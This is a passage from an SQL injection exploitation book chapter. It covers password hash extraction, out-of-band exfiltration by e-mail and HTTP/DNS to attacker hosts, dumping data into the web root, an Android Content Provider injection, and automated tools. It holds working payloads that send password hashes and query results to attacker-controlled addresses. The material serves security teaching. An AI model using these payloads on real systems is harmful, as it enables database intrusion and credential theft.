(b.attrval,instr(b.attrval,‘}’)+1)))) hash  \nfrom ods.ct_cn a,ods.ds_attrstore b  \nwhere a.entryid=b.entryid  \nand lower(b.attrname) in (  \n‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’,  \n‘authpassword’,‘orclpassword’)  \nand substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘MD5’  \norder by method,ssouser;  \nselect a.attrvalue ssouser, substr(b.attrval,2,instr(b.attrval,‘}’)- 2) method, \nrawtohex(utl_encode.base64_decode(utl_raw.cast_to_raw(substr  \n (b.attrval,instr(b.attrval,‘}’)+1)))) hash  \nfrom ods.ct_cn a,ods.ds_attrstore b  \nwhere a.entryid=b.entryid  \nand lower(b.attrname) in (  \n‘userpassword’,‘orclprpassword’,‘orclgupassword’,‘orclsslwalletpasswd’,  \n‘authpassword’,‘orclpassword’)  \nand substr(b.attrval,2,instr(b.attrval,‘}’)- 2)=‘SHA’  \norder by method,ssouser;  \nAdditional details and tools for cracking Oracle passwords are available at the following \nsites:  \n• www.red -database- security.com/whitepaper/oracle_passwords.html  \n• www.red -database- security.com /software/checkpwd.html  \n• www.evilfingers.com/tools/GSAuditor.php (download GSAuditor)  \n• www.soonerorlater.hu/index.khtml? article_id=513  (download woraauthbf)  \nOut-of-band communication \nAlthough the different exploitation techniques we’ve covered in this chapter vary in terms of \nexploitation method and desired result, they all have something in common: The query and the result s are always transmitted on the same communication channel. In other words, the \nHTTP(S) connection that is used to send the request is also used to receive the response. However, this does not always have to be the case: The results can be transferred acro ss a \ncompletely different channel, and we refer to such a communication as “out of band,” or simply OOB. What we leverage here is that modern database servers are very powerful applications, and their features go beyond simply returning data to a user perf orming a query. \nFor instance, if they need some information that resides on another database, they can open a connection to retrieve that data. They can also be instructed to send an e -mail when a specific \nevent occurs, and they can interact with the file system. All of this functionality can be very \nhelpful for an attacker, and sometimes they turn out to be the best way to exploit an SQL injection vulnerability when it is not possible to obtain the query results directly in the usual HTTP communication. Sometimes such functionality is not available to all users, but we have seen that privilege escalation attacks are not just a theoretical possibility.  \nThere are several ways to transfer data using an OOB communication, depending on the \nexact technology used in the back -end and on its configuration. A few techniques will be \nillustrated here, and some more in Chapter 5 , when talking specifically about blind SQL \ninjection, but the examples cannot cover all possibilities. So, if you are not able to extract data \nusing a normal HTTP connection and the database user that is performing the queries is powerful enough, use your creativity: An OOB communication can be the fastest way to successfully exploit the vulnerable application. \nE-mail  \nDatabases are very often critical parts of any infrastructure, and as such it is of the utmost importance that their administrators can quickly react to any problem that might arise. This is why most modern database servers offer some kind of e -mail functionality that can be used to \nautomatically send and receive e- mail messages in response to certain situations. For instance, \nif a new application user is added to a company’s profile the company administrator might be notified by e -mail automatically as a security precaution. The configuration of how to send the \ne-mail in this case is already completed; all an attacker needs to do is construct an exploit that \nwill extract interesting information, package the data in an e -mail, and queue the e -mail u sing \ndatabase -specific functions. The e -mail will then appear in the attacker’s mailbox.  \nMicrosoft SQL Server  \nAs is often the case, Microsoft SQL Server provides a nice built -in feature for sending e -mails. \nActually, depending on the SQL Server version, there might be not one, but two different e -\nmailing subsystems: SQL Mail (SQL Server 2000, 2005, and 2008) and Database Mail (SQL \nServer 2005 and 2008).  \nSQL Mail was the original e -mailing system for SQL Server. Microsoft announced with the \nrelease of SQL Se rver 2008 that this feature has been deprecated, and will be removed in \nfuture versions. It uses the Messaging Application Programming Interface (MAPI), and therefore it needs a MAPI messaging subsystem to be present on the SQL Server machine (e.g. Microso ft Outlook, but not Outlook Express) to send e -mails. Moreover, the e -mail client \nneeds to be already configured with the Post Office Protocol 3/Simple Mail Transfer Protocol (POP3/SMTP) or Exchange server to connect to, and with an account to use when connected. If the server you are attacking has SQL Mail running and configured, you only need to give a try to xp_startmail  (to start the SQL Client and log on to the mail server) and xp_sendmail  (the \nextended procedure to send an e -mail message with SQL Mail). xp_startmail  optionally takes \ntwo parameters ( @user  and @password) to specify the MAPI profile to use, but in a real \nexploitation scenario it’s quite unlikely that you have this information, and in any case you might not need it at all: If such paramete rs are not provided, xp_startmail  tries to use the \ndefault account of Microsoft Outlook, which is what is typically used when SQL Mail is configured to send e -mail messages in an automated way. Regarding xp_sendmail , its syntax is \nas follows (only the most  relevant options are shown):  \nxp_sendmail { [ @recipients= ] ‘recipients [;…n ]’ }[,[ @message= ] ‘message’ ]  \n[,[ @query= ] ‘query’ ]  \n[,[ @subject= ] ‘subject’ ]  \n[,[ @attachments= ] ‘attachments’ ]  \nAs you can see, it’s quite easy to use. So, a possible que ry to inject could be the following:  \nEXEC master..xp_startmail;  \nEXEC master..xp_sendmail @recipients = ‘admin@attacker.com’, @query =‘select @@version’  \nYou will receive the e- mail body in a Base64 format, which you can easily decode with a \ntool such as Bur p Suite. And the use of Base64 means you can transfer binary data as well.  \nWith xp_sendmail  it is even possible to retrieve arbitrary files, by simply specifying them in \nthe @attachment  variable. Keep in mind, however, that xp_sendmail  is enabled by default only \nfor members of the administrative groups.  \nFor more information about the xp_sendmail  extended procedure, refer to \nhttp://msdn.microsoft.com/en -us/library/ms189 505.aspx ; a full description of xp_startmail  is \navailable at http://msdn.microsoft.com/en -us/library/ms188392.aspx . \nIf xp_sendmail  does not work and your target is SQL Server 2005 or 200 8, you might still \nbe lucky: Starting with SQL Server 2005 Microsoft introduced a new  e-mail subsystem that is \ncalled Database Mail. One of its main advantages over SQL Mail is that because it uses \nstandard SMTP, it does not need a MAPI client such as Outl ook to work. To successfully send \ne-mails, at least one Database Mail profile must exist, which is simply a collection of Database \nMail accounts. Moreover, the user must be a member of the group DatabaseMailUserRole , and \nhave access to at least one Databas e Mail profile.  \nTo start Database Mail, it is enough to use sp_configure , while to actually send an e- mail \nyou need to use sp_send_dbmail , which is the Database Mail equivalent of xp_sendmail  for \nSQL Mail. Its syntax, together with the most important parameters, is as follows: \nsp_send_dbmail [ [ @profile_name = ] ‘profile_name’ ][, [ @recipients = ] ‘recipients [; …n \n]’ ] \n[, [ @subject = ] ‘subject’ ]  \n[, [ @body = ] ‘body’ ]  \n[, [ @file_attachments = ] ‘attachment [; …n ]’ ]  \n[, [ @query = ] ‘query’ ]  \n[, [ @execute_query_database = ] ‘execute_query_database’ ]  \nThe profile_name  indicates the profile to use to send the e -mail; if it’s left blank the default \npublic profile for the msdb  database will be used. If a profile does not exist, you can create one \nusing the following procedure:  \n1. Create a Database Mail account using msdb..sysmail_add_account_sp. You will need to \nknow a valid SMTP server that the remote database can contact and through which t he e-\nmail can be sent. This SMTP server can be some server on the Internet, or one that is under \nthe control of the attacker. However, if the database server can contact an arbitrary IP address on port 25, there are much faster ways to extract the data (e. g. using OPENROWSET  \non port 25, as I will show you in a following section) than using e -mail. Therefore, if you \nneed to use this technique it’s very likely that the database server cannot access external hosts, and so you will need to know the IP address of a valid SMTP server that resides on the target network. This may not be as hard as it sounds: If the Web application has some functionality that sends e -mail messages (e.g. with the results of some action of the user, or \nan e- mail to reset a user’s passw ord), it’s very likely that an SMTP server will appear in the \ne-mail headers. Alternatively, sending an e- mail to a non- existent recipient might trigger a \nresponse that contains the same information. However, this might not be enough if the SMTP server is authenticated: If this is the case, you will need a valid username and password to successfully create the Database Mail account.  \n2. Create a Database Mail profile, using msdb..sysmail_add_profile_sp.  \n3. Add the account that you created in step 1 to the pr ofile that you created in step 2, using \nmsdb..sysmail_add_profileaccount_sp.  \n4. Grant access to the profile that you created to the users in the msdb  database, using \nmsdb..sysmail_add_principalprofile_sp.  \nThe process, complete with examples, is described i n detail at http://msdn.microsoft.com/en -\nus/library/ms187605(SQL.90).aspx . If everything works and you have a valid Database Mail \naccount, you can finally run queries and have their results sent in an e -mail. Here is an \nexample of the whole process:  \n--Enable Database Mail  \nEXEC sp_configure ‘show advanced’, 1;  \nRECONFIGURE;  \nEXEC sp_configure ‘Database Mail XPs’, 1;  \nRECONFIGURE  \n--Create a new account, MYACC. The SMTP server is provided in this call.  \nEXEC \nmsdb.dbo.sysmail_add_account_sp@account_name=‘MYACC’,@email_address=‘hacked@victim.com’,  \n@display_name=‘mls’,@mailserver_name=‘smtp.victim.com’,  \n@account_id=NULL;  \n--Create a new profile, MYPROFILE  \nEXEC msdb.dbo.sysmail_add_profile_sp@profile_name=‘MYPROFILE’,@description=NULL, \n@profile_id=NULL;  \n--Bind the account to the profile  \nEXEC msdb.dbo.sysmail_add_profileaccount_sp \n@profile_name=‘MYPROFILE’,@account_name=‘acc’,@sequence_number=1  \n--Retrieve log in \nDECLARE @b VARCHAR(8000);  \nSELECT @b=SYSTEM_USER;  \n--Send the mail  \nEXEC msdb.dbo.sp_send_dbmail @profile_name=‘MYPROFILE’,@recipients=‘allyrbase@attacker.com’, \n@subject=‘system user’,@body=@b;  \nOracle  \nWhen it comes to using the database server to send e- mail messages, Oracle also provides two \ndifferent e -mailing systems depending on the database server version. From Version 8i, you \ncould send e -mails through the UTL_SMTP package, which provided the DBA with all the \ninstruments to start and manage an SMTP connection. Starting with Version 10g, Oracle \nintroduced the UTL_MAIL package, which is an extra layer over UTL_SMTP and allows administrators to use e -mailing in a faster and simpler way.  \nUTL_SMTP, as t he name suggests, provides a series of functions to start and manage an \nSMTP connection: You contact a server using UTL_SMTP.OPEN_CONNECTION , then send \nthe “HELO” message to that server using UTL_SMTP.HELO , and then specify the sender and \nreceiver using UT L_SMTP.MAIL  and UTL_SMTP.RCP , respectively. Then you can specify the \nmessage with UTL_SMTP.DATA  and finally terminate the session using UTL_SMTP.QUIT . \nWith UTL_MAIL, the whole process is a lot simpler, as you can perform it in its entirety \nwith the following stored procedure:  \nUTL_MAIL.SEND(sender, recipient, cc, bcc, subject, message, mime_type,priority)  \nKeep in mind that for obvious security reasons UTL_MAIL is not enabled by default; an \nadministrator must enable it manually. UTL_SMTP is, however, enabled by default and \ngranted to the public role. \nHTTP/DNS  \nOracle also offers two possibilities for performing HTTP requests: UTL_HTTP and HTTPURI_TYPE. The UTL_HTTP package and the HTTPURI_TYPE object type are granted \nto the public role by default and can be exe cuted by any user in the database as well as via \nSQL injection.  \nTo send, for example, the password hash of the SYS user to a remote system, you can inject \nthe following string:  \nor 1=utl_http.request (‘http://www.or asploit.com/’||(select password from dba_users where \nrownum=1)) -- \nvia the HTTPURI_TYPE object type as follows:  \nor 1=HTTPURI_TYPE(‘http://www.orasploit.com/’||(select password from dba_users where \nrownum=1)).getclob() -- \nAdditionally, if the SQL query is written inside the URL, the data (maximum 64  bytes) can \nalso be sent via the domain name system (DNS) lookup that is made to an external site as follows (We discuss this technique in more detail in Chapter 5 .): \nor 1= utl_http.request \n(‘http://www.‘||(selectpasswordfromdba_userswhererownum=1)||’.orasploit.com/’) -- \nFile System  \nSometimes the Web server and the database server happen to reside on the same box. This is a \ncommon case w hen the Web application has a limited number of users and/or it uses a limited \namount of data. In such cases, it might not be very cost -effective to split the architecture into \nmultiple tiers. Although such a choice is obviously very attractive for an orga nization that tries \nto minimize expenses, it has a number of security drawbacks, most notably the fact that a single flaw can be enough for an attacker to obtain full control over all the components. \nIn case an SQL injection flaw is discovered, such a setu p allows an easy and convenient way \nto extract information from the database server: If the attacker has enough privileges to write on the file system, he can redirect the results of a query to a file inside the Web server root, and then normally access th e file with the browser.  \nIf the database server and the Web server are on separate machines, it might still be possible \nto adopt this technique if the Web server is configured to export the folders that contain the Web site, and the database server is auth orized to write on them. \nNote that additional information on interacting with the file system is available in Chapter 6 . \nSQL Server \nWith Microsoft SQL Server there are various ways to redirect information to the file s ystem, if \nyour user has the privileges to do so, and the best one depends on the type and amount of data \nyou are dealing with. Sometimes you might need to export a simple line of text, such as the value of a built -in variable like \n@@version . This is also the case if you extract data from the \ndatabase into a single text value, such as the variable @hash  in the following code on SQL \nServer 2005, which retrieves the username and hash of the first user in the sql_logins  table:  \ndeclare @hash nvarchar(1000)  \nselect top 1 @hash = name + ‘ | ’ +master.dbo.fn_varbintohexstr(password_hash) from \nsys.sql_logins  \nIn such a case, it is fairly easy to redirect this value to a text file on the filesystem, by \ninjecting the following code: \n-- Declare needed variables  \nDECLARE @a int, @hash nvarchar(100), @fileid int;  \n-- Take the username and password hash of the first user in sql_logins  \n-- and store it into the variable @hash  \nSELECT top 1 @hash = name + ‘ | ’ +master.dbo.fn_varbintohexstr(password_hash) FROM \nsys.sql_logins;  \n-- Create a FileSystemObject pointing to the location of the desired file  \nEXEC sp_OACreate ‘Scripting.FileSystemObject’, @a OUT;  \nEXEC sp_OAMethod @a, ‘OpenTextFile’, @fileid OUT,‘c:\\ inetpub\\ wwwroot\\ hash.txt’, 8, 1;  \n-- Write the @hash variable into that file  \nEXEC sp_OAMethod @fileid, ‘WriteLine’, Null, @hash;  \n-- Destroy the objects that are not needed anymore  \nEXEC sp_OADestroy @fileid;  \nEXEC sp_OADestroy @a;  \nNow, all you need to do is to point your browser to the file location and retrieve the \ninformation, as shown in Figure 4.16.  \n \nFigure 4.16  Using the Server’s File System to Obtain the Password Hash of User sa  \nIf you need to repeat the process several times, you can make things easier by encapsulating \nthe code in a stored procedure that can be called at will.  \nThis technique works quite well for extracting small amounts of information, but what about \nextracting whole tables? The best option in that case is to rely on bcp.exe, a command- line \nutility shipped by default with SQL Server. As stated on MSDN, “The bcp utility bulk copies \ndata between an instance of Microsoft SQL Server and a data file in a user -specified format” \n(see http://msdn.microsoft.com/en -us/library/ms162802.aspx ). bcp.exe is a  powerful utility \nwhich accepts a large number of parameters. In our case, however, we are interested in only a few of them, so here’s an example that retrieves the entire sql_logins  table:  \nEXEC xp_cmdshell ‘bcp “select ∗ from sys.sql_logins”  queryout c:\\ inetpub\\wwwroot\\ hashes.txt \n-T -c’ \nWhat happens here? Because bcp is a command -line utility, you can only call it with \nxp_cmdshell  (or with an equivalent method you might have created; see Chapter 6 ). The first \nparameter  that is passed to bcp is the query, which can be any T -SQL that returns a result set. \nThe queryout  parameter is used to provide maximum flexibility, because it can handle bulk \ncopying of data. Then you specify the output file, which is the file where the data must be written and which must reside where it can be accessed with an HTTP connection in this \n\nexploit scenario. The − c switch indicates that a character data type must be used. If you need to \ntransfer binary data, you should use the − n switch instead . \nThe −T  switch deserves a deeper explanation. Because bcp.exe is a command -line utility \nthat needs to talk with a running installation of SQL Server, it will need to provide some form \nof authentication to perform its job. Usually, such authentication is performed with a username and password using the − U and − P parameters, but during a real attack you might not know \n(yet) such pieces of information. By using the − T switch, you tell bcp to connect to SQL \nServer with a trusted connection using Windows integr ated security. That is, the credentials of \nthe user executing the queries will be used.  \nIf everything goes according to plan, the entire \nsql_logins  table will be copied into \nhashes.txt, ready to be accessed with your browser, as shown in Figure 4.17 . \n \nFigure 4.17  Extracting an Entire Database Table to the File System  \nIn case trusted connections do not work, and you do not know the password of any user, you \ncan simply add a temporary user with sp_adduser , give it the password you want, make the user \na member of the sysadmin group with sp_addsrvrolemember , and finally call bcp using the user \nyou just created and its password with − U and − P. This is a method that is more invasive and \nleaves a larger footprint, but kept in mind if the trusted connection fails for some reason.  \nMySQL  \n\nOn MySQL, you can send the  results of a SELECT  statement into a file by appending to the \nquery the string INTO OUTFILE . By default, the file is written in the database directory, whose \nvalue on MySQL 5 is stored in the @@datadir  variable. However, you can specify an arbitrary \npath, and the results of the query will be successfully saved as long as MySQL has the \nnecessary privileges to write in that directory.  \nTo be able to perform this action, however, your user needs to have FILE privileges. To find \nout whether your user has such privileges you can use one of the following two queries:  \nSELECT file_priv FROM mysql.user WHERE user = ‘username’ --- MySQL 4/5  \nSELECT grantee,is_grantable FROM information_schema.user_privileges WHERE privilege_type = \n‘file’ AND grantee = ‘username’  \nAssumi ng that you have such privileges, if you know that the Web site root directory is \n/webroot/  and your MySQL user has write access to that directory, you could inject the \nfollowing query:  \nSELECT table_name FROM information_schema.tables INTO OUTFILE‘/webroot/tables.txt’;  \nThen, by pointing your browser to http://www.victim.com/tables.txt you would immediately \nretrieve the results of your query.  \nAlthough INTO OUTFILE  is well suited to extract text data, it can cr eate problems in cases of \nbinary data, because it will escape several characters. If you need a precise copy of some \nbinary data that you intend to extract, you can simply use INTO DUMPFILE  instead.  \nOracle  \nIn Oracle, most of the methods for accessing files  (UTL_FILE, DBMS_LOB, external tables, \nand Java) require PL/SQL. We will cover these methods in detail in Chapter 6 . \nSQL injection on mobile devices  \nSo far we have discussed SQL injection attacks against Web applicatio ns, and historically this \nis where many SQL injection vulnerabilities have been found. However, as technologies have changed this kind of vulnerability has started to pop up in some fairly unexpected places, such as on mobile devices. If you thought that S QL code was only running on databases deployed \non big servers, think again: lots of mobile phones and other embedded devices have SQL code \nbeing extensively used under the hood. Such code is mostly used to organize and manage small \ndata repositories like c ontacts, bookmarks, e -mails, or text messages.  \nObviously, considering the limited resources available on a mobile device in terms of \nmemory and CPU, the database server running such code needs to be a lot more lightweight compared to behemoths like SQL Ser ver or Oracle, and in most cases the choice is SQLite, an \nimplementation of a relational database written in C that is currently shipped as a library smaller than 300Kb! Being a library, it does not need to run as a separate process, it is simply linked to the program that needs it, and its code is accessed via function calls, reducing the \noverhead to a minimum. \nWe will have a brief look at how SQL injection can be found in Android- based devices, \nmore specifically in Content Providers, a type of inter proce ss communication  (IPC) endpoint \nused to provide data to applications via a content resolver. As you will see, things are very similar to what we have seen so far in terms of exploitation techniques. The only notable difference is that talking to a Content Provider (or any other SQLite instance in an embedded device) is a bit different from talking to a database server via a Web application using a browser, and might need a bit of extra coding beforehand. Keep in mind that in order to play with Android- based  devices, you don’t have to risk messing up your phone or tablet: you can \nsimply emulate a device, and the preferred version of Android, on your PC. \nNils from MWR InfoSecurity first presented this research at Black Hat Abu Dhabi in 2010, \nand you can find m ore information at the addresses https://media.blackhat.com/bh -ad-\n10/Nils/Black -Hat-AD-2010- android- sandcastle- wp.pdf  and \nhttp://labs.mwrinfosecurity.com/notices/webcontentresolver/.  \nIn order to look for SQL injection vulnerabilities on an Android device we first need to \ninstall the WebContentResolver application on it. This applicat ion allows us to talk to the \nContent Provider using a normal HTTP client such as our Web browser (and, by extension, lots of tools specifically targeted to SQL injection). You can download the tool, and its source code, at http://labs.mwrinfosecurity.com/tools/android_webcontentresolver/ . \nOnce you have installed and started the tool, you need to start the \nadb server , which is \nshipped with the Android SDK:  \npsilocybe platform -tools# ./adb devices  \n* daemon not running. Starting it now on port 5037 ∗  \n* daemon started successfully ∗ \nList of devices attached  \nEmulator- 5554 device  \nGood: it looks like we can successfully communicate with our device. Remember that if you \nare using a physical device you will have to turn USB debugging on in order to have a \nsuccessful communication. Now we can set up a port forward from a port on our computer to the port on the device where WebContentResolver is listening (8080 by default):  \npsilocybe platform -tools# ./adb forward tcp:8080 tcp:8080  \nThen we only need to point our Web browser to http://127.0.0.1:8080 and start having fun. \nWe start with a list of all Content Providers, with names and permission, requesting the URL http://127.0.0.1:8080/list : \npackage: com.android.browser  \nauthority: com.android.browser;browser  \nexported: true  \nreadPerm: com.android.browser.permission.READ_HISTORY_BOOKMARKS  \nwritePerm: com.android.browser.permission.WRITE_HISTORY_BOOKMARKS  \npathPerm0: /bookmarks/search_suggest_query  \nreadPerm0: android.permission.GLOBAL_SEARCH  \nwritePerm0: null  \n---------------------------------------------  \npackage: com.android.browser  \nauthority: com.android.browser.home  \nexported: false  \nreadPerm: com.android.browser.permission.READ_HISTORY_BOOKMARKS  \nwritePerm: null  \n---------------------------------------------  \npackage: com.android.browser  \nauthority: com.android.browser.snapshots  \nexported: false  \nreadPerm: null  \nwritePerm: null  \n---------------------------------------------  \npackage: com.android.calendar  \nauthority: com.android.calendar.CalendarRecentSuggestionsProvider  \nexported: true  \nreadPerm: null  \nwritePerm: null  \n---------------------------------------------  \npackage: com.android.deskclock  \nauthority: com.android.deskclock  \nexported: false  \nreadPerm: null  \nwritePerm: null  \n<snip>  \nEach of these can be easily tested for vulnerabilities using the techniques and tools detailed \nin this book, but for simplicity (and to avoid the irresponsible disclosure of new \nvulnerabilities) we will follow Nils’ example with the ‘Settings’ provider. We will use the \nquery method of WebContentResolver whose syntax is explained at the page http://127.0.0.1:8080/query : \nQueries a content provider and prints the content of the returned cursor.The query method \nlooks as follows: query (Uri uri, String[] projection, String selection, String[] \nselectionArgs, String sortOrder)  \nFollowing Parameters are supported:  \na: defines the authority to query (required)  \npath0..n: elements of the path. Will be used to construct the URI as follows: \ncontent://a/path0/path1/../pathn  \nproject0..n: elements in the projection array  \nselection: The selection argument.selectionName, selectionId: Both need to be provided. Will \nbe used to build a selection as follows selectionName+‘=’+selectionId. Will be used if no selection parameter is given.arg0..n: elements of the selectionArgs array\n \nsortOrder: the sortOrder argument  \nWe therefore view the contents of the setting table with the URL, \nhttp://localhost:8080/query?a=settings& path0=system  which returns the following (for clarity, \ncolumn alignment has been modified):  \nQuery successful:  \nColumn count: 3  \nRow count: 51  \n| _id | name | value  \n| 1 | volume_music | 11  \n| 4 | volume_voice | 4  \n| 5 | volume_alarm | 6  \n| 6 | volume_notification | 5  \n| 7 | volume_bluetooth_sco | 7  \n<snip>  \nAdding the selId  parameter to the URL \n(http://127.0.0.1:8080/query?a=settings&path0=system&selName=_id&selId=1 ) we can \nreduce the output to a single row:  \nQuery successful:  \nColumn count: 3  \nRow count: 1  \n| _id | name | value  \n| 1 | volume_music | 11  \nNow we simply add a single quote after the selId  parameter and we obtain the following \nerror message:  \nException:  \nandroid.database.sqlite.SQLiteException: unrecognized token: “’)”:, while compiling: SELECT \n∗ FROM system WHERE (_id=1’ ) unrecognized token: “’) ”:, while compiling: SELECT ∗ FROM \nsystem WHERE (_id=1’ ) \nWow! Looks fantastically similar to all other SQL er ror messages that have helped us so far, \nwhich means that from now on the attack is really a piece of cake. For instance, we can use the \ntraditional UNION -based attack to dump some content from the sqlite_master  table, by \nentering the following URL:  \nhttp://127.0.0.1:8080/query?a=settings&path0=system&selName=_id&selId=1)+union+select+name,t\nype,null+from+sqlite_master--  \nThe result is the following:  \nQuery successful:  \nColumn count: 3  \nRow count: 13  \n| _id | name | value  \n| 1 | volume_music | 11  \n| android_metadata  | table | null  \n| bluetooth_devices | table | null  \n| bookmarks | table | null  \n| bookmarksIndex1 | index | null  \n| bookmarksIndex2 | index | null  \n| secure | table | null  \n| secureIndex1 | index | null  \n| sqlite_autoindex_secure_1 | index | null  \n| sqlite_autoindex_system_1 | index | null  \n| sqlite_sequence | table | null  \n| system | table | null  \n| systemIndex1 | index | null  \nAs we can see, things look familiar again and we can easily apply the same techniques and \ntools used elsewhere in the book. What does it mean from a threat analysis perspective? It \nmeans that other applications that can access that Content Provider might r un a SQL injection \nattack and access the SQLite tables that specify the settings of your phone in an unauthorized way. Instead of having a client attacking a remote Web application (as in all our previous examples), we would have a malicious application on your phone attacking the phone itself \n(and/or other applications on it). A more advanced scenario, including obtaining data from a user’s device via client side SQL injection is discussed in Chapter 7 . \nThis is an exam ple for Android, but it can be easily generalized: anywhere SQL is used \nthere is the potential for some SQL injection vulnerabilities, no matter where this SQL code \nhappens to be run. The only additional challenge with mobile and other embedded devices is that there might be custom coding needed in order to talk with SQLite (or whatever other DB technology is used) and pass custom parameters. However, once you have bridged that gap, attacking that small app on your phone will not be different from attacking  the servers we have \nseen previously.  \nAutomating SQL injection exploitation  \nIn the previous sections, you saw a number of different attacks and techniques that you can use once you have found a vulnerable application. However, you might have noticed that m ost of \nthese attacks require a large number of requests to extract a decent amount of information from \nthe remote database. Depending on the situation, you might require dozens of requests to properly fingerprint the remote database server, and maybe hundr eds (or even thousands) to \nretrieve all the data you are interested in. Manually crafting such a vast number of requests would be extremely tedious, but fear not: Several tools can automate the whole process, allowing you to relax while watching the tables  being populated on your screen.  \nsqlmap  \nsqlmap is an open source command- line automatic SQL injection tool that is released under the \nterms of the GNU GPLv2 license by Bernardo Damele A.G. and Miroslav Stampar. It can be downloaded at http://sqlmap.sourceforge.net . \nAt the time of this writing, it is probably the SQL injection tool “par excellence,” thanks to \nits impressive list of features and very active mailing list. It will be able to help you in pretty much all situations, as it supports the following DB technologies:  \n• Microsoft SQL Server  \n• Microsoft Access  \n• Oracle  \n• MySQL  \n• PostgreSQL  \n• SQLite  \n• Firebird  \n• Sybase  \n• SAP MaxDB  \nsqlmap is not only an exploitation tool, but can also assist you in finding vulne rable \ninjection points. Once it detects one or more SQL injections on the target host, you can choose \n(depending on the situation and the privileges) among a variety of options:  \n• Perform an extensive back -end database server fingerprint.  \n• Retrieve the database server session user and database.  \n• Enumerate users, password hashes, privileges, and databases.  \n• Dump the entire database server table/columns or the user’s specific database server \ntable/columns, using various techniques to optimize the extraction and reduce the time needed for the attack.  \n• Run custom SQL statements.  \n• Read arbitrary files.  \n• Run commands at the operating system level.  \nsqlmap is developed in Python, which makes the tool independent of the underlying \noperating system as it only requires the Python interpreter version equal to or later than 2.4. sqlmap also implements various technique s to exploit a SQL injection vulnerability:  \n• \nUNION  query SQL injection, both when the application returns all rows in a single response \nand when it returns only one row at a time.  \n• Stacked query support. \n• Inferential SQL injection. For each HTTP respons e, by making a comparison based on \nHTML page content hashes, or string matches, with the original request, the tool determines \nthe output value of the statement character by character. The bisection algorithm \nimplemented in sqlmap to perform this technique  can fetch each output character with, at \nmost, seven HTTP requests. This is sqlmap’s default SQL injection technique. \nAs its input, sqlmap accepts a single target URL, a list of targets from the log files of Burp \nor WebScarab, or a “Google dork” which que ries the Google search engine and parses its \nresults page. There is even a sqlmap plugin for Burp available at the address \nhttp://code.google.com/p/gason/ . sqlmap can automatically test all the provided GET /POST \nparameters, the HTTP cookies, and the HTTP User -Agent header values; alternatively, you can \noverride this behavior and specify the parameters that need to be tested. sqlmap also supports multithreading to speed up blind SQL injection algorithms; it estimates the time needed to complete an attack depending on the speed of performed requests, and allows you to save the current session and retrieve it later. It also integrates with other security -related open source \nprojects, such as Metasploit and w3af.  \nIt can even be used to directly connect to a database and perform the attack without a Web \napplication in between (as long as the credentials to the database are available, of course).  \nKeep in mind that this is just a very brief overview of the sqlmap’s num erous features, as \nillustrating all possible options and possibilities would require several pages, and would not add much to the tool’s extensive documentation, which you can find at the address \nhttp://sqlmap.sourceforge.net/doc/README.html . \nBobcat  \nBobcat is an automated SQL injection tool that is designed to aid a security consultant in taking full advantage of SQL injection vulnerabilities; you can download it at http://www.northern- monkee.co.uk/pub/bobcat.html . It was originally created to extend the \ncapabilities of a tool by Cesar Cerrudo, called Data Thief.  \nBobcat has numerous features that will aid in the compromise of a vulne rable application \nand help exploit the database server, such as listing linked servers and database schemas, dumping data, brute -forcing accounts, elevating privileges, and executing operating system \ncommands. Bobcat can exploit SQL injection vulnerabiliti es in Web applications, independent \nof their language, but is dependent on SQL Server as the back -end database. It also requires a \nlocal installation of Microsoft SQL Server or Microsoft SQL Server Desktop Engine (MSDE).  \nThe tool also uses the error -based method for exploiting SQL injection vulnerabilities, so if \nthe remote database server is protected by sufficient egress filtering, exploitation is still \npossible. According to the author, the next version will include extended support for other \ndatabases and new features (such as the ability to exploit blind injections) and will also be open source. The most useful and unique feature of  Bobcat is its ability to exploit the database \nserver through the use of an OOB channel. Bobcat implements the “OPENROWSET”  style of \nOOB channel as introduced by Chris Anley in 2002 (see www.nextgenss.com/papers/more_advanced_sql_injection.pdf ); hence, it’s a requirement for a \nlocal Microsoft SQL S erver or MSDE installation. We explain OOB connections using \nOPENROWSET  in more detail in Chapter 5 . Figure 4.18 shows a screenshot of the tool. \n \nFigure 4.18  Screenshot of Bobcat  \nBSQL  \nAnother very interesting tool for Windows boxes is BSQL, developed by Ferruh Mavituna and available at http://code.google.com/p/bsqlhacker/ . Even though its development appears to \nhave been discontinued in favor of Netsparker (a commercial product), it performed extremely well according to the OWASP SQLiBENCH project, a benchm arking project of automatic \nSQL injectors that perform data extraction ( http://code.google.com/p/sqlibench/ ), and therefore \ndeserves mention.  \nBSQL is released under the GPLv2, works on any Windows machine  with .NET Framework \n2 installed, and comes with an automated installer. It supports error -based injection and blind \ninjection and offers the possibility of using an interesting alternative approach to time -based \ninjection, where different timeouts are use d depending on the value of the character to extract \nso that more than 1 bit can be extracted with each request. The technique, which the author dubbed “deep blind injection,” is described in detail in a paper that you can download from http://labs.portcullis.co.uk/download/Deep_Blind_SQL_Injection.pdf . \n\nBSQL can find SQL injection vulnerabilities and extract information from the following \ndatabases:  \n• Oracle  \n• SQL Server  \n• My SQL  \nFigure 4.19 shows an example screenshot of an ongoing BSQL attack.  \n \nFigure 4.19  BSQL During an Active Session  \nBSQL is multithreaded and is very easy to configure, thanks to a wizard that you can start \nby clicking the Injection Wizard button on the main window. The wizard will ask you to enter \nthe target URL and the parameters to include in the request, and then wi ll perform a series of \ntests, looking for vulnerabilities in the parameters that have been marked for testing. If a vulnerable parameter is found, you will be informed, and the actual extraction attack will start. \n\nBy clicking the Extracted Database tab, yo u can see the data as it is being extracted, as shown \nin Figure 4.20.  \n \nFigure 4.20  BSQL Extracting the Tables and Columns of the Remote Database  \nOther Tools  \nYou’ve been given a brief overview of some tools that can assist you in performing an efficient \ndata extraction, but keep in mind that several other tools out there can do a very good job too. Among the most popular are the following:  \n• FG-Injection Framework ( http://sourceforge.net/projects/injection -fwk/) \n• Havij ( http://itsecteam.com/en/projects/project1.htm)  \n• SqlInjector ( http://www.woanware.co.uk/?page_id=19)  \n• SQLGET ( www.infobytecom.ar ) \n\n• Sqlsus ( http://sqlsus.sourceforge.net/ ) \n• Pangolin ( http://www.nosec -inc.com/en/products/pangolin/ ) \n• Absinthe ( http://0x90.org/releases/absinthe/)  \nSummary  \nIn this chapter, a set of techniques that are aimed at transforming a vulnerability into a fully \nfledged attack were illustrated. The first and simplest form of exploitation uses UNION  \nstatements to extract data by appending to the results returned by the original query. UNION  \nstatements allow the attacker to extract a vast amount of information in a very fast and reliable way, making this technique a powerful weapon in your  arsenal. In case UNION -based attacks \naren’t a viable option, you can still extract data by using conditional statements that trigger a different response from the database depending 